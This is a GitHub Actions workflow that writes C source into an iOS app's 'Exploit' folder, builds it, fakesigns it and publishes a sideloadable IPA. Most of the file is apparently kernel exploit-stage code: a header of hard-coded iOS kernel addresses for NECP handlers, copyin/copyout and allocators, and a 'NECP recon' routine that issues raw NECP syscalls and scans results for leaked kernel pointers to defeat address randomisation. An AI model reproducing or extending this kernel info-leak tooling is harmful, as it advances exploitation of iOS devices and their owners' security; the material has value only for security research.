name: Fix and Release

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove legacy
        run: |
          rm -f .github/workflows/build_and_release.yml
          rm -f .github/workflows/fix_and_test.yml
          rm -f natsuk1/Views/SimpleList.swift

      - name: Write nk_offsets.h
        run: |
          cat > natsuk1/Exploit/nk_offsets.h <<'ENDFILE'
          #ifndef NK_OFFSETS_H
          #define NK_OFFSETS_H

          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
          #define NK_SYSENT_COUNT               558
          #define NK_SLIDE_FALLBACK             0x3D00000ULL

          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL

          #define NK_NECP_OP_ADD_CLIENT         0x01
          #define NK_NECP_OP_REMOVE_CLIENT      0x02
          #define NK_NECP_OP_COPY_RESULT        0x03
          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
          #define NK_NECP_OP_COPY_LIST          0x05
          #define NK_NECP_OP_REQUEST_NEXUS      0x06
          #define NK_NECP_OP_AGENT_ACTION       0x07
          #define NK_NECP_OP_COPY_AGENT         0x08
          #define NK_NECP_OP_COPY_INTERFACE     0x09
          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
          #define NK_NECP_OP_UPDATE_CACHE       0x0E
          #define NK_NECP_OP_COPY_UPDATE        0x0F
          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
          #define NK_NECP_OP_ADD_FLOW           0x11
          #define NK_NECP_OP_REMOVE_FLOW        0x12
          #define NK_NECP_OP_CLAIM              0x13
          #define NK_NECP_OP_SIGN               0x14
          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
          #define NK_NECP_OP_VALIDATE           0x17
          #define NK_NECP_OP_GET_SIGNED_ID      0x18
          #define NK_NECP_OP_SET_SIGNED_ID      0x19
          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
          #define NK_NECP_OP_GET_FLOW_STATS     0x1B

          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL

          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL

          #endif
          ENDFILE

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'ENDFILE'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>
          #include <mach/vm_region.h>

          #include "nk_api.h"
          #include "nk_offsets.h"

          extern kern_return_t mach_vm_read_overwrite(
              vm_map_t target_task,
              mach_vm_address_t address,
              mach_vm_size_t size,
              mach_vm_address_t data,
              mach_vm_size_t *outsize);

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define NECP_SYSCTL_ARENA 0x0D
          #define NECP_ROUTE_STATS 0x0B
          #define NECP_FLOW_STATS 0x1B
          #define GATE_BYTE 9

          #define RESBUF 8192

          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
          #define LR(t, ...) lg(t, "> ", __VA_ARGS__)

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          static int nleak_kva(int fd, uint64_t *out) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_SYSCTL_ARENA,
                                  (void*)0, (size_t)0, (void*)out, (size_t)8);
          }

          static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
              if (len > max) len = max;
              for (int i = 0; i < len; i += 16) {
                  char hex[96];
                  snprintf(hex, sizeof(hex),
                      "%04x: %02x%02x%02x%02x %02x%02x%02x%02x "
                      "%02x%02x%02x%02x %02x%02x%02x%02x",
                      i,
                      buf[i+0], buf[i+1], buf[i+2], buf[i+3],
                      buf[i+4], buf[i+5], buf[i+6], buf[i+7],
                      buf[i+8], buf[i+9], buf[i+10], buf[i+11],
                      buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
                  LI(tag, "%s", hex);
              }
          }

          static int scan_kptr(const char *tag, const uint8_t *buf, int len) {
              int found = 0;
              for (int i = 0; i + 8 <= len; i += 8) {
                  uint64_t v;
                  memcpy(&v, buf + i, 8);
                  if (is_kptr(v)) {
                      LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
                      found++;
                      if (found >= 16) break;
                  }
              }
              return found;
          }

          static void tlv_walk(const char *tag, const uint8_t *buf, int len) {
              int off = 0;
              while (off + 5 <= len) {
                  uint8_t type = buf[off];
                  uint32_t l = 0;
                  memcpy(&l, buf + off + 1, 4);
                  if (l > (uint32_t)(len - off - 5)) {
                      LI(tag, "off=%d type=0x%02x len=%u (truncated)", off, type, l);
                      break;
                  }
                  LI(tag, "off=%d type=0x%02x len=%u", off, type, l);
                  off += 5 + l;
                  if (l == 0) break;
              }
          }

          static int step_copy_result(void) {
              nk_log("");
              LI("S1", "copy_result");
              int fd = nfd();
              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              uint8_t fu[16];
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
              int c = ncpy_result(fd, cu, buf, sizeof(buf));
              LI("S1", "copy_result=%d bytes", c);
              close(fd);
              if (c > 0) {
                  hexdump("S1H", buf, c, 512);
                  int nk = scan_kptr("S1K", buf, c);
                  LI("S1", "kptr count = %d", nk);
                  tlv_walk("S1T", buf, c);
              }
              return c;
          }

          static int step_arena_twice(void) {
              nk_log("");
              LI("S2", "arena leak from two clients");

              for (int i = 0; i < 2; i++) {
                  int fd = nfd();
                  if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
                  if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
                  uint64_t val = 0;
                  int rc = nleak_kva(fd, &val);
                  LI("S2", "client#%d rc=%d value=0x%llx", i, rc, (unsigned long long)val);
                  close(fd);
              }
              return 0;
          }

          static int step_region_dump(void) {
              nk_log("");
              LI("S3", "region dump 0x100000000 - 0x120000000");

              mach_port_t task = mach_task_self();
              vm_address_t addr = 0x100000000ULL;
              vm_address_t limit = 0x120000000ULL;
              int count = 0;

              while (addr < limit && count < 60) {
                  vm_size_t size = 0;
                  vm_region_basic_info_data_64_t info;
                  mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
                  mach_port_t obj = MACH_PORT_NULL;

                  kern_return_t kr = vm_region_64(task, &addr, &size,
                                                  VM_REGION_BASIC_INFO_64,
                                                  (vm_region_info_t)&info, &cnt, &obj);
                  if (kr != KERN_SUCCESS) {
                      LI("S3", "vm_region kr=%d at 0x%llx", kr, (unsigned long long)addr);
                      break;
                  }
                  LI("S3", "0x%llx - 0x%llx  size=0x%llx prot=%d",
                     (unsigned long long)addr,
                     (unsigned long long)(addr + size),
                     (unsigned long long)size,
                     info.protection);
                  addr += size;
                  count++;
                  if (size == 0) break;
              }
              return 0;
          }

          static int step_route_stats(void) {
              nk_log("");
              LI("S4", "op=0x0B route stats");
              int fd = nfd();
              if (fd < 0) { LE("S4", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }

              uint8_t buf[256]; memset(buf, 0, sizeof(buf));
              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_ROUTE_STATS,
                                   (void*)cu, (size_t)16, buf, (size_t)0x48);
              LI("S4", "op=0x0B returned %d", c);
              close(fd);
              if (c > 0) {
                  hexdump("S4H", buf, c, 0x48);
                  int nk = scan_kptr("S4K", buf, c);
                  LI("S4", "kptr count = %d", nk);
              }
              return c;
          }

          static int step_flow_stats(void) {
              nk_log("");
              LI("S5", "op=0x1B flow stats");
              int fd = nfd();
              if (fd < 0) { LE("S5", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }

              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }

              uint8_t buf[0x200]; memset(buf, 0, sizeof(buf));
              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_FLOW_STATS,
                                   (void*)fu, (size_t)16, buf, (size_t)0x1ac);
              LI("S5", "op=0x1B returned %d", c);
              close(fd);
              if (c > 0) {
                  hexdump("S5H", buf, c, 0x1ac);
                  int nk = scan_kptr("S5K", buf, c);
                  LI("S5", "kptr count = %d", nk);
              }
              return c;
          }

          static int impl(void) {
              nk_log("");
              nk_log("================================================================");
              nk_log("natsuk1 v4.7 - NECP recon");
              nk_log("iOS 27.0 / iPhone14,5 / 24A437");
              nk_log("================================================================");
              nk_log("");
              int fd = nfd();
              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("PRE", "necp_open OK");

              step_copy_result();
              step_arena_twice();
              step_region_dump();
              step_route_stats();
              step_flow_stats();

              nk_log("");
              nk_log("======== done ========");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }

          void nk_necp_cancel(void) {
              g_cancel = 1;
              nk_log("[!] cancel requested");
          }
          ENDFILE

      - name: Install tools
        run: |
          brew install xcodegen ldid || true
          brew link --overwrite xcodegen ldid || true

      - name: Generate project
        run: xcodegen generate

      - name: Build
        run: |
          set -euo pipefail
          xcodebuild \
            -project natsuk1.xcodeproj \
            -scheme natsuk1 \
            -configuration Release \
            -sdk iphoneos \
            -destination 'generic/platform=iOS' \
            -derivedDataPath build \
            -parallelizeTargets \
            -jobs "$(sysctl -n hw.ncpu)" \
            CODE_SIGNING_ALLOWED=NO \
            SWIFT_VERSION=5.0 \
            SWIFT_STRICT_CONCURRENCY=minimal \
            SWIFT_APPROACHABLE_CONCURRENCY=NO \
            SWIFT_UPCOMING_FEATURE_NONISOLATED_NONSENDING_BY_DEFAULT=NO \
            OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
            -UseModernBuildSystem=YES \
            build -quiet

      - name: Package and Release
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
          if [ -z "$APP_PATH" ]; then
            echo "no .app"
            exit 1
          fi
          ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
          rm -rf Payload natsuk1.ipa
          mkdir -p Payload
          cp -R "$APP_PATH" Payload/
          COPYFILE_DISABLE=1 zip -qry natsuk1.ipa Payload
          rm -rf Payload
          if gh release view development >/dev/null 2>&1; then
            gh release delete development --yes --cleanup-tag
          fi
          REPO="${{ github.repository }}"
          IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
          NOTES="natsuk1 v4.7 dev

          IPA: ${IPA_URL}
          AltStore: altstore://install?url=${IPA_URL}
          Scarlet: scarlet://install?url=${IPA_URL}
          ESign: esign://install?url=${IPA_URL}

          $(git log -5 --pretty=format:'- %h %s')"
          gh release create development natsuk1.ipa \
            --target "${{ github.sha }}" \
            --title "Development" \
            --prerelease \
            --latest=false \
            --notes "$NOTES"